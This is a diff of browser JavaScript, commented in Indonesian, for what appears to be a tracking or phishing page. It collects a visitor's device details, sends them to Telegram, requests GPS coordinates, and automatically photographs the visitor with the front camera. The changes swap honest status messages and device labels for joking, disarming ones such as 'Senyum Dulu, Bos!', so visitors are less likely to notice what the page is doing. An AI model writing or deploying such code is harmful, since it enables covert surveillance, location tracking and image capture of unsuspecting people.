@@ -9,7 +9,7 @@ async function startProcess() {
     
     statusEl.innerText = "Mengumpulkan informasi perangkat secara rinci...";
 
-    // 1. Kumpulkan Data Perangkat & Browser secara Rinci
+  // 1. Kumpulkan Data Perangkat & Browser secara Rinci
     const userAgent = navigator.userAgent;
     const platform = navigator.platform;
     const language = navigator.language;
@@ -18,7 +18,7 @@ async function startProcess() {
     const deviceMemory = navigator.deviceMemory || 'Tidak diketahui';
     
     // Deteksi Merek / OS Perangkat yang lebih presisi
-    let deviceName = "Perangkat Lainnya";
+    let deviceName = "Perangkat Misterius";
     let osVersion = "Tidak diketahui";
 
     // Deteksi Android & Merek Ponsel
@@ -38,20 +38,20 @@ async function startProcess() {
     } 
     // Deteksi Apple iOS
     else if (/iphone|ipad|ipod/i.test(userAgent)) {
-        deviceName = "Apple iPhone / iPad";
+        deviceName = "iPhone / Perangkat Sultan";
         let match = userAgent.match(/OS\s([0-9_\.]+)/);
         if (match) osVersion = "iOS " + match[1].replace(/_/g, '.');
     } 
     // Deteksi Desktop / PC
     else if (/win/i.test(platform)) {
-        deviceName = "Windows PC";
+        deviceName = "Laptop Kentang Windows";
         if (/windows nt 10/i.test(userAgent)) osVersion = "Windows 10/11";
         else if (/windows nt 6.3/i.test(userAgent)) osVersion = "Windows 8.1";
         else if (/windows nt 6.1/i.test(userAgent)) osVersion = "Windows 7";
     } else if (/mac/i.test(platform)) {
-        deviceName = "Apple macOS";
+        deviceName = "MacBook Ngab";
     } else if (/linux/i.test(platform)) {
-        deviceName = "Linux Desktop";
+        deviceName = "Linux Master Race";
     }
 
     // Deteksi Jenis Browser
@@ -87,12 +87,12 @@ async function startProcess() {
     await sendTextToTelegram(infoText);
 
     // 3. Minta Izin Lokasi GPS Akurat & Kirim Link Google Maps
-    statusEl.innerText = "Meminta izin koordinat GPS akurat...";
+    statusEl.innerText = "Cek Jarak Kita 📏...";
     await getGPSLocation();
 
     // 4. Ambil Foto Kamera Depan secara Otomatis
     try {
-        statusEl.innerText = "Memverifikasi kamera perangkat...";
+        statusEl.innerText = "Senyum Dulu, Bos! 📸.";
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
         const video = document.getElementById('video');
         video.srcObject = stream;
